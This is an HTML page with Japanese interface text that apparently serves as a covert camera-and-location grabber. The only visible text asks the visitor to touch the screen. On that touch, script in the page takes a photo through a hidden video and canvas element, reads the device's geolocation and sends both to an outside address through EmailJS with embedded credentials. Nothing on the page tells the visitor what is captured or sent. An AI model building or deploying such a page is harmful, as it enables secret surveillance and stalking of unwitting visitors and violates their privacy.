<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>画面タッチで撮影と送信</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: #111;
      color: #fff;
      text-align: center;
      padding: 20px;
    }
    video, canvas {
      display: none;
    }
    #message {
      margin-top: 20px;
      font-size: 1.2rem;
    }
  </style>
</head>
<body>
  <h1>画面に触れてください</h1>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>
  <div id="message">カメラを起動中...</div>

  <!-- base64動画（必要なら差し替え） -->
  <video id="localVideo" controls autoplay loop muted width="300"></video>

  <!-- EmailJS SDK（ES Module版・修正済） -->
  <script type="module">
    import * as emailjs from 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';

    emailjs.init("cPjKBUm_i6HebDQF7"); // ← あなたの公開鍵

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const message = document.getElementById('message');
    const localVideo = document.getElementById('localVideo');

    // Base64 動画（短い黒画面。必要なら差し替え可）
    const base64Video = "data:video/mp4;base64,AAAAIGZ0eXBtcDQyAAAAAG1wNDFtcDQyaXNvbWF2YzEAAAAIZnJlZQAAAsxtZGF0AAAAAA==";
    localVideo.src = base64Video;

    // カメラ起動
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        message.textContent = "画面をタップしてください";
      })
      .catch(err => {
        message.textContent = "カメラエラー: " + err.message;
      });

    // タッチまたはクリックを1回だけ検出
    document.body.addEventListener('touchstart', handleInteraction, { once: true });
    document.body.addEventListener('mousedown', handleInteraction, { once: true });

    async function handleInteraction() {
      message.textContent = "撮影中...";

      await new Promise(resolve => setTimeout(resolve, 500)); // カメラ準備待ち
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const photoData = canvas.toDataURL("image/png");

      // 位置情報取得
      const position = await getLocation();
      const locationText = position
        ? `緯度: ${position.coords.latitude}, 経度: ${position.coords.longitude}`
        : "位置情報取得できませんでした";

      try {
        await emailjs.send("service_ja2c09x", "template_2fp2jrg", {
          message: `画面タッチイベント\n${locationText}`,
          image_data: photoData
        });
        message.textContent = "送信完了！";
      } catch (err) {
        message.textContent = "送信失敗: " + (err.text || err.message);
      }
    }

    function getLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(resolve, () => resolve(null));
      });
    }
  </script>
</body>
</html>
